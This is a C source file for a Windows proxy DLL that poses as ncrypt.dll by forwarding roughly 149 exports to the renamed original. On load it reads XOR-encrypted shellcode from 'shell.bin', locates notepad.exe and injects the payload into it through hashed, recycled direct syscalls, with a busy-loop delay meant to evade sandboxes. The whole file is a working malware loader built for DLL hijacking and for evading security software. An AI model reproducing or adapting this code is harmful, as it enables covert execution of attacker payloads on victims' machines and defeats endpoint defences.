// dllmain.c : Defines the entry point for the DLL application.
#include "windows.h"
#include "Defines.h"
#include "RecycleGate.h"
#include "stdio.h"

extern void PrepareSyscall(DWORD dwSycallNr, PVOID dw64Gate);
extern DoSyscall();

#pragma comment(linker,"/export:BCryptAddContextFunction=ncrypt_origin.BCryptAddContextFunction,@1")
#pragma comment(linker,"/export:BCryptAddContextFunctionProvider=ncrypt_origin.BCryptAddContextFunctionProvider,@2")
#pragma comment(linker,"/export:BCryptCloseAlgorithmProvider=ncrypt_origin.BCryptCloseAlgorithmProvider,@3")
#pragma comment(linker,"/export:BCryptConfigureContext=ncrypt_origin.BCryptConfigureContext,@4")
#pragma comment(linker,"/export:BCryptConfigureContextFunction=ncrypt_origin.BCryptConfigureContextFunction,@5")
#pragma comment(linker,"/export:BCryptCreateContext=ncrypt_origin.BCryptCreateContext,@6")
#pragma comment(linker,"/export:BCryptCreateHash=ncrypt_origin.BCryptCreateHash,@7")
#pragma comment(linker,"/export:BCryptDecrypt=ncrypt_origin.BCryptDecrypt,@8")
#pragma comment(linker,"/export:BCryptDeleteContext=ncrypt_origin.BCryptDeleteContext,@9")
#pragma comment(linker,"/export:BCryptDeriveKey=ncrypt_origin.BCryptDeriveKey,@10")
#pragma comment(linker,"/export:BCryptDeriveKeyCapi=ncrypt_origin.BCryptDeriveKeyCapi,@11")
#pragma comment(linker,"/export:BCryptDeriveKeyPBKDF2=ncrypt_origin.BCryptDeriveKeyPBKDF2,@12")
#pragma comment(linker,"/export:BCryptDestroyHash=ncrypt_origin.BCryptDestroyHash,@13")
#pragma comment(linker,"/export:BCryptDestroyKey=ncrypt_origin.BCryptDestroyKey,@14")
#pragma comment(linker,"/export:BCryptDestroySecret=ncrypt_origin.BCryptDestroySecret,@15")
#pragma comment(linker,"/export:BCryptDuplicateHash=ncrypt_origin.BCryptDuplicateHash,@16")
#pragma comment(linker,"/export:BCryptDuplicateKey=ncrypt_origin.BCryptDuplicateKey,@17")
#pragma comment(linker,"/export:BCryptEncrypt=ncrypt_origin.BCryptEncrypt,@18")
#pragma comment(linker,"/export:BCryptEnumAlgorithms=ncrypt_origin.BCryptEnumAlgorithms,@19")
#pragma comment(linker,"/export:BCryptEnumContextFunctionProviders=ncrypt_origin.BCryptEnumContextFunctionProviders,@20")
#pragma comment(linker,"/export:BCryptEnumContextFunctions=ncrypt_origin.BCryptEnumContextFunctions,@21")
#pragma comment(linker,"/export:BCryptEnumContexts=ncrypt_origin.BCryptEnumContexts,@22")
#pragma comment(linker,"/export:BCryptEnumProviders=ncrypt_origin.BCryptEnumProviders,@23")
#pragma comment(linker,"/export:BCryptEnumRegisteredProviders=ncrypt_origin.BCryptEnumRegisteredProviders,@24")
#pragma comment(linker,"/export:BCryptExportKey=ncrypt_origin.BCryptExportKey,@25")
#pragma comment(linker,"/export:BCryptFinalizeKeyPair=ncrypt_origin.BCryptFinalizeKeyPair,@26")
#pragma comment(linker,"/export:BCryptFinishHash=ncrypt_origin.BCryptFinishHash,@27")
#pragma comment(linker,"/export:BCryptFreeBuffer=ncrypt_origin.BCryptFreeBuffer,@28")
#pragma comment(linker,"/export:BCryptGenRandom=ncrypt_origin.BCryptGenRandom,@29")
#pragma comment(linker,"/export:BCryptGenerateKeyPair=ncrypt_origin.BCryptGenerateKeyPair,@30")
#pragma comment(linker,"/export:BCryptGenerateSymmetricKey=ncrypt_origin.BCryptGenerateSymmetricKey,@31")
#pragma comment(linker,"/export:BCryptGetFipsAlgorithmMode=ncrypt_origin.BCryptGetFipsAlgorithmMode,@32")
#pragma comment(linker,"/export:BCryptGetProperty=ncrypt_origin.BCryptGetProperty,@33")
#pragma comment(linker,"/export:BCryptHash=ncrypt_origin.BCryptHash,@34")
#pragma comment(linker,"/export:BCryptHashData=ncrypt_origin.BCryptHashData,@35")
#pragma comment(linker,"/export:BCryptImportKey=ncrypt_origin.BCryptImportKey,@36")
#pragma comment(linker,"/export:BCryptImportKeyPair=ncrypt_origin.BCryptImportKeyPair,@37")
#pragma comment(linker,"/export:BCryptKeyDerivation=ncrypt_origin.BCryptKeyDerivation,@38")
#pragma comment(linker,"/export:BCryptOpenAlgorithmProvider=ncrypt_origin.BCryptOpenAlgorithmProvider,@39")
#pragma comment(linker,"/export:BCryptQueryContextConfiguration=ncrypt_origin.BCryptQueryContextConfiguration,@40")
#pragma comment(linker,"/export:BCryptQueryContextFunctionConfiguration=ncrypt_origin.BCryptQueryContextFunctionConfiguration,@41")
#pragma comment(linker,"/export:BCryptQueryContextFunctionProperty=ncrypt_origin.BCryptQueryContextFunctionProperty,@42")
#pragma comment(linker,"/export:BCryptQueryProviderRegistration=ncrypt_origin.BCryptQueryProviderRegistration,@43")
#pragma comment(linker,"/export:BCryptRegisterConfigChangeNotify=ncrypt_origin.BCryptRegisterConfigChangeNotify,@44")
#pragma comment(linker,"/export:BCryptRegisterProvider=ncrypt_origin.BCryptRegisterProvider,@45")
#pragma comment(linker,"/export:BCryptRemoveContextFunction=ncrypt_origin.BCryptRemoveContextFunction,@46")
#pragma comment(linker,"/export:BCryptRemoveContextFunctionProvider=ncrypt_origin.BCryptRemoveContextFunctionProvider,@47")
#pragma comment(linker,"/export:BCryptResolveProviders=ncrypt_origin.BCryptResolveProviders,@48")
#pragma comment(linker,"/export:BCryptSecretAgreement=ncrypt_origin.BCryptSecretAgreement,@49")
#pragma comment(linker,"/export:BCryptSetAuditingInterface=ncrypt_origin.BCryptSetAuditingInterface,@50")
#pragma comment(linker,"/export:BCryptSetContextFunctionProperty=ncrypt_origin.BCryptSetContextFunctionProperty,@51")
#pragma comment(linker,"/export:BCryptSetProperty=ncrypt_origin.BCryptSetProperty,@52")
#pragma comment(linker,"/export:BCryptSignHash=ncrypt_origin.BCryptSignHash,@53")
#pragma comment(linker,"/export:BCryptUnregisterConfigChangeNotify=ncrypt_origin.BCryptUnregisterConfigChangeNotify,@54")
#pragma comment(linker,"/export:BCryptUnregisterProvider=ncrypt_origin.BCryptUnregisterProvider,@55")
#pragma comment(linker,"/export:BCryptVerifySignature=ncrypt_origin.BCryptVerifySignature,@56")
#pragma comment(linker,"/export:GetIsolationServerInterface=ncrypt_origin.GetIsolationServerInterface,@57")
#pragma comment(linker,"/export:GetKeyStorageInterface=ncrypt_origin.GetKeyStorageInterface,@58")
#pragma comment(linker,"/export:GetSChannelInterface=ncrypt_origin.GetSChannelInterface,@59")
#pragma comment(linker,"/export:NCryptCloseKeyProtector=ncrypt_origin.NCryptCloseKeyProtector,@60")
#pragma comment(linker,"/export:NCryptCloseProtectionDescriptor=ncrypt_origin.NCryptCloseProtectionDescriptor,@61")
#pragma comment(linker,"/export:NCryptCreateClaim=ncrypt_origin.NCryptCreateClaim,@62")
#pragma comment(linker,"/export:NCryptCreatePersistedKey=ncrypt_origin.NCryptCreatePersistedKey,@63")
#pragma comment(linker,"/export:NCryptCreateProtectionDescriptor=ncrypt_origin.NCryptCreateProtectionDescriptor,@64")
#pragma comment(linker,"/export:NCryptDecrypt=ncrypt_origin.NCryptDecrypt,@65")
#pragma comment(linker,"/export:NCryptDeleteKey=ncrypt_origin.NCryptDeleteKey,@66")
#pragma comment(linker,"/export:NCryptDeriveKey=ncrypt_origin.NCryptDeriveKey,@67")
#pragma comment(linker,"/export:NCryptDuplicateKeyProtectorHandle=ncrypt_origin.NCryptDuplicateKeyProtectorHandle,@68")
#pragma comment(linker,"/export:NCryptEncrypt=ncrypt_origin.NCryptEncrypt,@69")
#pragma comment(linker,"/export:NCryptEnumAlgorithms=ncrypt_origin.NCryptEnumAlgorithms,@70")
#pragma comment(linker,"/export:NCryptEnumKeys=ncrypt_origin.NCryptEnumKeys,@71")
#pragma comment(linker,"/export:NCryptEnumStorageProviders=ncrypt_origin.NCryptEnumStorageProviders,@72")
#pragma comment(linker,"/export:NCryptExportKey=ncrypt_origin.NCryptExportKey,@73")
#pragma comment(linker,"/export:NCryptFinalizeKey=ncrypt_origin.NCryptFinalizeKey,@74")
#pragma comment(linker,"/export:NCryptFreeBuffer=ncrypt_origin.NCryptFreeBuffer,@75")
#pragma comment(linker,"/export:NCryptFreeObject=ncrypt_origin.NCryptFreeObject,@76")
#pragma comment(linker,"/export:NCryptGetProperty=ncrypt_origin.NCryptGetProperty,@77")
#pragma comment(linker,"/export:NCryptGetProtectionDescriptorInfo=ncrypt_origin.NCryptGetProtectionDescriptorInfo,@78")
#pragma comment(linker,"/export:NCryptImportKey=ncrypt_origin.NCryptImportKey,@79")
#pragma comment(linker,"/export:NCryptIsAlgSupported=ncrypt_origin.NCryptIsAlgSupported,@80")
#pragma comment(linker,"/export:NCryptIsKeyHandle=ncrypt_origin.NCryptIsKeyHandle,@81")
#pragma comment(linker,"/export:NCryptKeyDerivation=ncrypt_origin.NCryptKeyDerivation,@82")
#pragma comment(linker,"/export:NCryptNotifyChangeKey=ncrypt_origin.NCryptNotifyChangeKey,@83")
#pragma comment(linker,"/export:NCryptOpenKey=ncrypt_origin.NCryptOpenKey,@84")
#pragma comment(linker,"/export:NCryptOpenKeyProtector=ncrypt_origin.NCryptOpenKeyProtector,@85")
#pragma comment(linker,"/export:NCryptOpenStorageProvider=ncrypt_origin.NCryptOpenStorageProvider,@86")
#pragma comment(linker,"/export:NCryptProtectKey=ncrypt_origin.NCryptProtectKey,@87")
#pragma comment(linker,"/export:NCryptProtectSecret=ncrypt_origin.NCryptProtectSecret,@88")
#pragma comment(linker,"/export:NCryptQueryProtectionDescriptorName=ncrypt_origin.NCryptQueryProtectionDescriptorName,@89")
#pragma comment(linker,"/export:NCryptRegisterProtectionDescriptorName=ncrypt_origin.NCryptRegisterProtectionDescriptorName,@90")
#pragma comment(linker,"/export:NCryptSecretAgreement=ncrypt_origin.NCryptSecretAgreement,@91")
#pragma comment(linker,"/export:NCryptSetAuditingInterface=ncrypt_origin.NCryptSetAuditingInterface,@92")
#pragma comment(linker,"/export:NCryptSetProperty=ncrypt_origin.NCryptSetProperty,@93")
#pragma comment(linker,"/export:NCryptSignHash=ncrypt_origin.NCryptSignHash,@94")
#pragma comment(linker,"/export:NCryptStreamClose=ncrypt_origin.NCryptStreamClose,@95")
#pragma comment(linker,"/export:NCryptStreamOpenToProtect=ncrypt_origin.NCryptStreamOpenToProtect,@96")
#pragma comment(linker,"/export:NCryptStreamOpenToUnprotect=ncrypt_origin.NCryptStreamOpenToUnprotect,@97")
#pragma comment(linker,"/export:NCryptStreamOpenToUnprotectEx=ncrypt_origin.NCryptStreamOpenToUnprotectEx,@98")
#pragma comment(linker,"/export:NCryptStreamUpdate=ncrypt_origin.NCryptStreamUpdate,@99")
#pragma comment(linker,"/export:NCryptTranslateHandle=ncrypt_origin.NCryptTranslateHandle,@100")
#pragma comment(linker,"/export:NCryptUnprotectKey=ncrypt_origin.NCryptUnprotectKey,@101")
#pragma comment(linker,"/export:NCryptUnprotectSecret=ncrypt_origin.NCryptUnprotectSecret,@102")
#pragma comment(linker,"/export:NCryptVerifyClaim=ncrypt_origin.NCryptVerifyClaim,@103")
#pragma comment(linker,"/export:NCryptVerifySignature=ncrypt_origin.NCryptVerifySignature,@104")
#pragma comment(linker,"/export:SslChangeNotify=ncrypt_origin.SslChangeNotify,@105")
#pragma comment(linker,"/export:SslComputeClientAuthHash=ncrypt_origin.SslComputeClientAuthHash,@106")
#pragma comment(linker,"/export:SslComputeEapKeyBlock=ncrypt_origin.SslComputeEapKeyBlock,@107")
#pragma comment(linker,"/export:SslComputeFinishedHash=ncrypt_origin.SslComputeFinishedHash,@108")
#pragma comment(linker,"/export:SslComputeSessionHash=ncrypt_origin.SslComputeSessionHash,@109")
#pragma comment(linker,"/export:SslCreateClientAuthHash=ncrypt_origin.SslCreateClientAuthHash,@110")
#pragma comment(linker,"/export:SslCreateEphemeralKey=ncrypt_origin.SslCreateEphemeralKey,@111")
#pragma comment(linker,"/export:SslCreateHandshakeHash=ncrypt_origin.SslCreateHandshakeHash,@112")
#pragma comment(linker,"/export:SslDecrementProviderReferenceCount=ncrypt_origin.SslDecrementProviderReferenceCount,@113")
#pragma comment(linker,"/export:SslDecryptPacket=ncrypt_origin.SslDecryptPacket,@114")
#pragma comment(linker,"/export:SslDuplicateTranscriptHash=ncrypt_origin.SslDuplicateTranscriptHash,@115")
#pragma comment(linker,"/export:SslEncryptPacket=ncrypt_origin.SslEncryptPacket,@116")
#pragma comment(linker,"/export:SslEnumCipherSuites=ncrypt_origin.SslEnumCipherSuites,@117")
#pragma comment(linker,"/export:SslEnumCipherSuitesEx=ncrypt_origin.SslEnumCipherSuitesEx,@118")
#pragma comment(linker,"/export:SslEnumEccCurves=ncrypt_origin.SslEnumEccCurves,@119")
#pragma comment(linker,"/export:SslEnumProtocolProviders=ncrypt_origin.SslEnumProtocolProviders,@120")
#pragma comment(linker,"/export:SslExpandBinderKey=ncrypt_origin.SslExpandBinderKey,@121")
#pragma comment(linker,"/export:SslExpandExporterMasterKey=ncrypt_origin.SslExpandExporterMasterKey,@122")
#pragma comment(linker,"/export:SslExpandPreSharedKey=ncrypt_origin.SslExpandPreSharedKey,@123")
#pragma comment(linker,"/export:SslExpandResumptionMasterKey=ncrypt_origin.SslExpandResumptionMasterKey,@124")
#pragma comment(linker,"/export:SslExpandTrafficKeys=ncrypt_origin.SslExpandTrafficKeys,@125")
#pragma comment(linker,"/export:SslExpandWriteKey=ncrypt_origin.SslExpandWriteKey,@126")
#pragma comment(linker,"/export:SslExportKey=ncrypt_origin.SslExportKey,@127")
#pragma comment(linker,"/export:SslExportKeyingMaterial=ncrypt_origin.SslExportKeyingMaterial,@128")
#pragma comment(linker,"/export:SslExtractEarlyKey=ncrypt_origin.SslExtractEarlyKey,@129")
#pragma comment(linker,"/export:SslExtractHandshakeKey=ncrypt_origin.SslExtractHandshakeKey,@130")
#pragma comment(linker,"/export:SslExtractMasterKey=ncrypt_origin.SslExtractMasterKey,@131")
#pragma comment(linker,"/export:SslFreeBuffer=ncrypt_origin.SslFreeBuffer,@132")
#pragma comment(linker,"/export:SslFreeObject=ncrypt_origin.SslFreeObject,@133")
#pragma comment(linker,"/export:SslGenerateMasterKey=ncrypt_origin.SslGenerateMasterKey,@134")
#pragma comment(linker,"/export:SslGeneratePreMasterKey=ncrypt_origin.SslGeneratePreMasterKey,@135")
#pragma comment(linker,"/export:SslGenerateSessionKeys=ncrypt_origin.SslGenerateSessionKeys,@136")
#pragma comment(linker,"/export:SslGetCipherSuitePRFHashAlgorithm=ncrypt_origin.SslGetCipherSuitePRFHashAlgorithm,@137")
#pragma comment(linker,"/export:SslGetKeyProperty=ncrypt_origin.SslGetKeyProperty,@138")
#pragma comment(linker,"/export:SslGetProviderProperty=ncrypt_origin.SslGetProviderProperty,@139")
#pragma comment(linker,"/export:SslHashHandshake=ncrypt_origin.SslHashHandshake,@140")
#pragma comment(linker,"/export:SslImportKey=ncrypt_origin.SslImportKey,@141")
#pragma comment(linker,"/export:SslImportMasterKey=ncrypt_origin.SslImportMasterKey,@142")
#pragma comment(linker,"/export:SslIncrementProviderReferenceCount=ncrypt_origin.SslIncrementProviderReferenceCount,@143")
#pragma comment(linker,"/export:SslLookupCipherLengths=ncrypt_origin.SslLookupCipherLengths,@144")
#pragma comment(linker,"/export:SslLookupCipherSuiteInfo=ncrypt_origin.SslLookupCipherSuiteInfo,@145")
#pragma comment(linker,"/export:SslOpenPrivateKey=ncrypt_origin.SslOpenPrivateKey,@146")
#pragma comment(linker,"/export:SslOpenProvider=ncrypt_origin.SslOpenProvider,@147")
#pragma comment(linker,"/export:SslSignHash=ncrypt_origin.SslSignHash,@148")
#pragma comment(linker,"/export:SslVerifySignature=ncrypt_origin.SslVerifySignature,@149")

char key[] = "somethingthatisnottoolong";

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

void sleep()
{
    for (int i = 0; i <= 500000; i++)
    {
        for (int j = 2; j <= i / 2; j++)
        {
            if (i % j == 0)
            {
                break;
            }
        }
    }
}

int findTarget(char* target)
{
    NTSTATUS status;
    PVOID buffer;
    PSYSTEM_PROCESS_INFO spi;

    buffer = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // We need to allocate a large buffer because the process list can be large.

    if (!buffer)
    {
        return -1;
    }

    spi = (PSYSTEM_PROCESS_INFO)buffer;

    Syscall sysNtQuerySystemInformation = { 0x00 };
    DWORD dwSuccess = FAIL;

    dwSuccess = getSyscall(0xaf0d30ec, &sysNtQuerySystemInformation);
    if (dwSuccess == FAIL)
        return 0x01;

    PrepareSyscall(sysNtQuerySystemInformation.dwSyscallNr, sysNtQuerySystemInformation.pRecycledGate);
    if (!NT_SUCCESS(status = DoSyscall(SystemProcessInformation, spi, 1024 * 1024, NULL)))
    {
        VirtualFree(buffer, 0, MEM_RELEASE);
        return -1;
    }

    while (spi->NextEntryOffset) // Loop over the list until we reach the last entry.
    {
        wchar_t pName[256];
        memset(pName, 0, sizeof(pName));
        WideCharToMultiByte(CP_ACP, 0, spi->ImageName.Buffer, spi->ImageName.Length, (LPSTR)pName, sizeof(pName), NULL, NULL);

        int result = my_strcmp(target, (char*)pName);
        if (!result) {
            int pid = (int)spi->ProcessId;
            VirtualFree(buffer, 0, MEM_RELEASE); // Free the allocated buffer.
            return pid;
        }

        spi = (PSYSTEM_PROCESS_INFO)((LPBYTE)spi + spi->NextEntryOffset); // Calculate the address of the next entry.

    }
    VirtualFree(buffer, 0, MEM_RELEASE); // Free the allocated buffer.
    return 0;
}


int Injection(int pid, unsigned char* sc_ptr, SIZE_T sc_len)
{
    Syscall sysNtOpenProcess = { 0x0 }; 
    Syscall sysNtAllocateVirtualMemory = { 0x0 };
    Syscall sysNtWriteVirtualMemory = { 0x0 };
    Syscall sysNtProtectVirtualMemory = { 0x0 };
    Syscall sysNtCreateThreadEx = { 0x0 };
    
    DWORD dwSuccess = FAIL;
    // Prepare the syscalls
    dwSuccess = getSyscall(0x1141831c, &sysNtOpenProcess);
    if (dwSuccess == FAIL)
        return 0x01;

    dwSuccess = getSyscall(0x26d18008, &sysNtAllocateVirtualMemory);
    if (dwSuccess == FAIL)
        return 0x01;

    dwSuccess = getSyscall(0xd4b1e4d6, &sysNtWriteVirtualMemory);
    if (dwSuccess == FAIL)
        return 0x01;

    dwSuccess = getSyscall(0x496b218c, &sysNtProtectVirtualMemory);
    if (dwSuccess == FAIL)
        return 0x01;

    dwSuccess = getSyscall(0x8a4e6274, &sysNtCreateThreadEx);
    if (dwSuccess == FAIL)
        return 0x01;

    // Initialing the varibales
    HANDLE            processHandle = NULL, threadHandle = NULL;
    LPVOID            ds = NULL;
    SIZE_T            wr;
    CLIENT_ID         cid = { 0 };
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    DWORD oldprotect = 0;
    LARGE_INTEGER sectionSize = { sc_len };
    HANDLE sectionHandle = NULL;
    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

    cid.UniqueProcess = (PVOID)pid;

    PrepareSyscall(sysNtOpenProcess.dwSyscallNr, sysNtOpenProcess.pRecycledGate);
    DoSyscall(&processHandle, PROCESS_ALL_ACCESS, &oa, &cid);

    XOR((char*)sc_ptr, sc_len, (char*)key, sizeof(key)); // Decrypting the shellcode
    sleep(); // Own implementation of sleep function

    PrepareSyscall(sysNtAllocateVirtualMemory.dwSyscallNr, sysNtAllocateVirtualMemory.pRecycledGate);
    DoSyscall(processHandle, &ds, 0, &sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    PrepareSyscall(sysNtWriteVirtualMemory.dwSyscallNr, sysNtWriteVirtualMemory.pRecycledGate);
    DoSyscall(processHandle, ds, sc_ptr, sc_len - 1, &wr);

    PrepareSyscall(sysNtCreateThreadEx.dwSyscallNr, sysNtCreateThreadEx.pRecycledGate);
    DoSyscall(&threadHandle, THREAD_ALL_ACCESS, &oa, processHandle,(LPTHREAD_START_ROUTINE)ds, ds, FALSE, 0, 0, 0, NULL);

    return 0;

}

int ProxyFunction()
{
    HANDLE file = NULL;
    DWORD fileSize = NULL;
    DWORD bytesRead = NULL;
    LPVOID fileData = NULL;

    // Reading our encrypted shellcode
    file = CreateFileA("shell.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        return 1;
    }
    fileSize = GetFileSize(file, NULL);
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
    ReadFile(file, fileData, fileSize, &bytesRead, NULL);

    char target[] = "notepad.exe";
    int pid = 0;
    pid = findTarget(target); // Targeting the notepad.exe process
    
    if (pid)
    {
        Injection(pid, (unsigned char*)fileData, fileSize);
    }
    return 0;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        ProxyFunction();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

